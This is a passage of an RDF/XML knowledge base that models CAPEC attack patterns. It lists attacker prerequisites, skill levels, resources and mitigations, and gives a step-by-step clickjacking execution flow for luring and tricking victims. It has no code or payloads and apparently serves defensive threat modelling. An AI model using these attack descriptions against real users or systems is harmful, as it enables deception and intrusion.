    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:To inject the malicious payload in a web page:LEVEL:Low::SKILL:To bypass non trivial filters in the application:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker250">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#402"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack250"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::285::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the system containing the ATA Drive so that the drive can be physically removed from the system.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read  regardless of the actual array size  then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack325"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Properly handle the NULL characters supplied as part of user input prior to doing anything with the data.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack241"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that the system is Unicode aware and can properly process Unicode data. Do not make an assumption that data will be in ASCII.::Ensure that filtering or input validation is applied to canonical data.::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack304"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker251">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#153"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack251"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker384">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#1"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack384"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::285::732::276::693::721::434::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.::The various resources  or individual URLs  must be somehow discoverable by the attacker::The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:In order to discover unrestricted resources  the attacker does not need special tools or skills. He only has to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker92">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#159"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack92"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::706::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must utilize external libraries and must fail to verify the integrity of these libraries before using them.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To modify the entries in the configuration file pointing to malicious libraries:LEVEL:Low::SKILL:To force symlink and timing issues for redirecting access to libraries:LEVEL:Medium::SKILL:To reverse engineering the libraries and inject malicious code into the libraries:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker258">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#395"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack258"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker125">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#212"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack125"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary has the capability to interact with the application directly.The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:General computer knowledge about how applications are launched  how they interact with input/output  and how they are configured.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Distort packet sizes and timing at VPN layer by adding padding to normalize packet sizes and timing delays to reduce information leakage via timing.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack303"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Fix the Windows loading process to eliminate the preferential search order by looking for DLLs in the precise location where they are expected Design: Sign system DLLs so that unauthorized DLLs can be detected.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack82"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker91">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#440"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack91"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Influence over the deployed system at a victim location.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker257">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#177"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack257"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::706::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must include external files. Most non-trivial applications meet this criterion.::The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.::The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion  but if an attacker can manipulate the application&apos;s search path (possibly by controlling environmental variables) then they can force this criterion to be met.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application&apos;s search path.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker124">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#122"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack124"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::732::269::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must have misconfigured their access control mechanisms such that sensitive information  which should only be accessible to more trusted users  remains accessible to less trusted users.::The adversary must have access to the target  albeit with an account that is less privileged than would be appropriate for the targeted resources.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. The ability to access the target is required.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configuration: Disable client side caching.::Implementation: Listens for query replies on a network  and sends a notification via email when an entry changes.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack259"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Perform input validation for all remote content  including remote and user-generated content::Implementation: Only allow known files to be included (whitelist)::Implementation: Make use of indirect references passed in URL parameters instead of file names::Configuration: Ensure that remote scripts cannot be include in the include or require PHP directives::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack406"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker94">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#573"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack94"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker389">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#47"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack389"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::119::118::130::131::74::20::680::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The program expands one of the parameters passed to a function with input controlled by the user  but a later function making use of the expanded parameter erroneously considers the original  not the expanded size of the parameter.::The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is).::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Finding this particular buffer overflow may not be trivial. Also  stack and especially heap based buffer overflows require a lot of knowledge if the intended goal is arbitrary code execution. Not only that the attacker needs to write the shell code to accomplish his or her goals  but the attacker also needs to find a way to get the program execution to jump to the planted shell code. There also needs to be sufficient room for the payload. So not every buffer overflow will be exploitable  even by a skilled attacker.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  explicit intents should be used whenever sensitive data is being sent. An explicit intent is delivered to a specific application as declared within the intent  whereas the Android operating system determines who receives an implicit intent which could potentially be a malicious application. If an implicit intent must be used  then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly. Implicit intents should never be used for inter-application communication.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack19"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker256">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#161"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack256"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted client must access the site via infrastructure that the attacker has co-opted and must fail to adequately verify that the communication channel is operating correctly (e.g. by verifying that they are  in fact  connected to the site they intended.)::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack  the attacker must be able to stand up their own services that mimic the services the targeted client intends to use.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker123">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#463"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack123"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::209::514::649::347::354::696::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The decryption routine does not properly authenticate the message / does not verify its integrity prior to performing the decryption operation::The target system leaks data (in some way) on whether a padding error has occurred when attempting to decrypt the ciphertext.::The padding oracle remains available for enough time / for as many requests as needed for the adversary to decrypt the ciphertext.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to detect instances where a target system is vulnerable to an oracle padding attack Sufficient cryptography knowledge and tools needed to take advantage of the presence of the padding oracle to perform decryption / encryption of data without a key::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker93">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#175"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack93"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.::The victim must run the targeted application  possibly using the crafted parameters that the adversary uses to identify the code to include.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary may need the capability to host code modules if they wish their own code files to be included.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker122">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#173"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack122"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must convince the victim into performing the decoy action.::The adversary must have the means to control a user&apos;s interface to present them with a decoy action as well as the actual malicious action. Simple versions of this attack can be performed using web pages requiring only that the adversary be able to host (or control) content that the user visits.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker388">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#24"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack388"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::119::118::74::20::680::733::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Ability to control the length of data passed to an active filter.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker255">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#476"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack255"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::290::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Recipient is using signature verification software that does not clearly indicate potential homographs in the signer identity.Recipient is using signature verification software that contains a parsing vulnerability  or allows control characters in the signer identity field  such that a signature is mistakenly displayed as valid and from a known or authoritative signer.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Attacker needs to understand the layout and composition of data blobs used by the target application.:LEVEL:High::SKILL:To discover a specific vulnerability  attacker needs to reverse engineer signature parsing  signature verification and signer representation code.:LEVEL:High::SKILL:Attacker may be required to create malformed data blobs and know how to insert them in a location that the recipient will visit.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Prevent adversary access to privileged accounts necessary to install rootkits.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack84"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker96">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#577"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack96"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::Administrator permissions are required to view the home folder of other users.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Perform whitelist validation against a positive specification for command length  type  and parameters.::Design: Limit program privileges  so if commands circumvent program input validation or filter routines then commands do not running under a privileged account::Implementation: Perform input validation for all remote content.::Implementation: Use type conversions such as JDBC prepared statements.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack211"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker95">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#575"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack95"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker98">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#576"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack98"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker97">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#574"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack97"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker382">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#103">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:173::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Clickjacking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack382">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#103"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::1021::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:(Craft a clickjacking page) The adversary utilizes web page layering techniques to try to craft a malicious clickjacking pageTECHNIQUE:The adversary leveraged iframe overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged Flash file overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged Silverlight overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged cross-frame scripting to craft a malicious clickjacking page::STEP:2:PHASE:Exploit:DESCRIPTION:(Adversary lures victim to clickjacking page) Adversary utilizes some form of temptation  misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.TECHNIQUE:Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Lure the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:(Trick victim into interacting with the clickjacking page in the desired manner) The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim&apos;s level of privilege.TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::1021::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim is communicating with the target application via a web based UI and not a thick client::The victim&apos;s browser security policies allow at least one of the following JavaScript  Flash  iFrames  ActiveX  or CSS.::The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser)::The victim has an active session with the target system.::The target system&apos;s interaction window is open in the victim&apos;s browser and supports the ability for initiating sensitive actions on behalf of the user in the target system::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Crafting the proper malicious site and luring the victim to this site are not trivial tasks.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::If using the Firefox browser  use the NoScript plug-in that will help forbid iFrames.::Turn off JavaScript  Flash and disable CSS.::When maintaining an authenticated session with a privileged target system  do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack382"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Input validation. Assume that user inputs are malicious. Utilize strict type  character  and encoding enforcement::Implementation: Perform input validation for all remote content  including remote and user-generated content.::Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.::Implementation: Prefer working without user input when using file system calls::Implementation: Use indirect references rather than actual file names.::Implementation: Use possible permissions on file access when developing and deploying web applications.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack252"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker383">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#222"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack383"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::1021::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim is communicating with the target application via a web based UI and not a thick client. The victim&apos;s browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system&apos;s interaction window is open in the victim&apos;s browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Crafting the proper malicious site and luring the victim to this site is not a trivial task.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker381">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#53"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack381"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::158::172::173::171::74::20::697::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Null terminators are not properly handled by the filter.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker needs to understand alternate encodings  what the filter looks for and the data format acceptable to the target API:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Protect the schema against unauthorized modification.::Implementation: For applications that use a known schema  use a local copy or a known good repository instead of the schema reference supplied in the schema document.::Implementation: For applications that leverage remote schemas  use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack41"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Ensure that the transparent proxy uses an actual network layer IP address for routing requests. On the transparent proxy  disable the use of routing based on address information in the HTTP host header. Configuration: Disable in the browser the execution of Java Script  Flash  SilverLight  etc.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack4"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker99">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#416"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack99"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The adversary must have the means and knowledge of how to communicate with the target in some manner.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::An iterative approach to input validation may be required to ensure that no dangerous characters are present. It may be necessary to implement redundant checking across different input validation layers. Ensure that invalid data is rejected as soon as possible and do not continue to work with it.::Make sure to perform input validation on canonicalized data (i.e. data that is data in its most standard form). This will help avoid tricky encodings getting past the filters.::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack332"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker380">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#151"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack380"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::287::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The identity associated with the message or resource must be removable or modifiable in an undetectable way.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::While copying and pasting of data with the clipboard is a legitimate and practical function  certain situations and context may require the disabling of this feature. Just as certain applications disable screenshot capability  applications that handle highly sensitive information should consider disabling copy and paste functionality.::Employ a robust identification and audit/blocking via whitelisting of applications on your system. Malware may contain the functionality associated with this attack pattern.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack421"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Default deny access control policies::Design: Input validation routines should check and enforce both input data types and content against a positive specification. In regards to IP addresses  this should include the authorized manner for the application to represent IP addresses and not accept user specified IP addresses and IP address formats (such as ranges)::Implementation: Perform input validation for all remote content.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack459"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Employ robust cybersecurity training for all employees.::Implement system antivirus software that scans all attachments before opening them.::Regularly patch all software.::Execute all suspicious files in a sandbox environment.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack116"/>
  </j.0:MitigationAction>
</rdf:RDF>
